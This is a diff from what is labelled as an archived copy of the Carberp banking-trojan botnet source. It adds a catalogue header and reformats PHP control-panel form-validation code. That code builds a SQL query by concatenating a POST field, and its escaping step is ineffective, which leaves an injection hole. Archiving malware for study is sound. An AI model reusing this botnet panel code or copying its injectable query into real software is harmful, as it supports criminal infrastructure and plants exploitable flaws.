@@ -1,17 +1,30 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
 get_function('real_escape_string');
 
-if(isset($_POST['submit'])){	$format = $_POST['format'];
+if(isset($_POST['submit'])){
+	$format = $_POST['format'];
 	@array_walk($_POST, 'real_escape_string');
 	$_POST['format'] = $format;
 
 	if(empty($_POST['name'])){
 		$bad_form['name'] = $lang['knbp'];
 		$FORM_BAD = 1;
-	}else{		if(strlen($_POST['name']) > 125){
+	}else{
+		if(strlen($_POST['name']) > 125){
 			$bad_form['name'] = $lang['knbpaq'];
 			$FORM_BAD = 1;
 		}
@@ -25,10 +38,13 @@ if(isset($_POST['submit'])){	$format = $_POST['format'];
 			$bad_form['nid'] = $lang['nidza'];
 			$FORM_BAD = 1;
 		}else{
-        	if(strlen($_POST['nid']) > 8){        		$bad_form['nid'] = $lang['nidzaq'];
+        	if(strlen($_POST['nid']) > 8){
+        		$bad_form['nid'] = $lang['nidzaq'];
         		$FORM_BAD = 1;
-        	}else{        		$result = $mysqli->query("SELECT nid FROM bf_systems WHERE (nid='".$_POST['nid']."')");
-        		if($result->nid == $_POST['nid']){        			$bad_form['nid'] = $lang['vxyes'];
+        	}else{
+        		$result = $mysqli->query("SELECT nid FROM bf_systems WHERE (nid='".$_POST['nid']."')");
+        		if($result->nid == $_POST['nid']){
+        			$bad_form['nid'] = $lang['vxyes'];
         			$FORM_BAD = 1;
         		}
         	}
@@ -38,7 +54,8 @@ if(isset($_POST['submit'])){	$format = $_POST['format'];
 	if(empty($_POST['percent'])){
 		$bad_form['percent'] = $lang['knbpa'];
 		$FORM_BAD = 1;
-	}else{		if(strlen($_POST['percent']) > 2){
+	}else{
+		if(strlen($_POST['percent']) > 2){
 			$bad_form['percent'] = $lang['knbpaa'];
 			$FORM_BAD = 1;
 		}else{
